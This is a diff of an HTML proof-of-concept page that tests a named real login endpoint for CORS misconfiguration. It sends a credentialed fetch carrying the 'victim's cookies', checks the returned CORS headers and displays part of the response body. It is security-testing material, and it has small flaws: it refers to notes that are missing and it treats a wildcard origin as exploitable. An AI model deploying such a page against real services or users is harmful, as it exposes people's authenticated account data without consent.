@@ -1,37 +1,60 @@
-<!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-<title>CORS Test</title>
+<meta charset="UTF-8">
+<title>CORS Misconfiguration PoC</title>
+<style>
+  body { font-family: monospace; max-width: 700px; margin: 40px auto; padding: 0 16px; }
+  #status { font-weight: bold; }
+  #result { white-space: pre-wrap; background: #f4f4f4; padding: 12px; border: 1px solid #ccc; margin-top: 12px; }
+  .vulnerable { color: #b00020; }
+  .safe { color: #146c2e; }
+</style>
 </head>
 <body>
-<h1>CORS PoC</h1>
-<pre id="output"></pre>
+<h2>CORS Misconfiguration PoC</h2>
+<p>Target: <code id="targetDisplay"></code></p>
+<p id="status">Sending request...</p>
+<div id="result"></div>
  
-    <script>
-
-    fetch("https://accounts.eu1.gigya.com/accounts.login", {
-
-        credentials: "include"
-
+<script>
+  // --- Configure this ---
+  const TARGET_URL = "https://accounts.eu1.gigya.com/accounts.login";
+  // ----------------------
+ 
+  document.getElementById("targetDisplay").textContent = TARGET_URL;
+ 
+  const statusEl = document.getElementById("status");
+  const resultEl = document.getElementById("result");
+ 
+  fetch(TARGET_URL, {
+    method: "GET",
+    credentials: "include", // sends victim's cookies/session for the target origin
+  })
+    .then(async (response) => {
+      const acao = response.headers.get("access-control-allow-origin");
+      const acac = response.headers.get("access-control-allow-credentials");
+ 
+      const text = await response.text();
+ 
+      const vulnerable =
+        (acao === window.location.origin || acao === "*" ) &&
+        acac === "true";
+ 
+      statusEl.innerHTML = vulnerable
+        ? '<span class="vulnerable">VULNERABLE: cross-origin credentialed response was readable.</span>'
+        : '<span class="safe">Not vulnerable via this simple check (see notes below).</span>';
+ 
+      resultEl.textContent =
+        `Access-Control-Allow-Origin: ${acao}\n` +
+        `Access-Control-Allow-Credentials: ${acac}\n\n` +
+        `Response body (first 1000 chars):\n${text.slice(0, 1000)}`;
     })
-
-    .then(r => r.text())
-
-    .then(data => {
-
-        document.getElementById("output").innerText = data;
-
-        console.log(data);
-
-    }) 
-
-    .catch(err => {
-
-        document.getElementById("output").innerText = err;
-
+    .catch((err) => {
+      statusEl.innerHTML = '<span class="safe">Request blocked by browser (likely NOT vulnerable, or network error).</span>';
+      resultEl.textContent = "Error: " + err.message +
+        "\n\nNote: a blocked fetch usually means proper CORS enforcement " +
+        "(missing/mismatched ACAO header, or ACAC not set to true).";
     });
 </script>
 </body>
 </html>
- 
- 
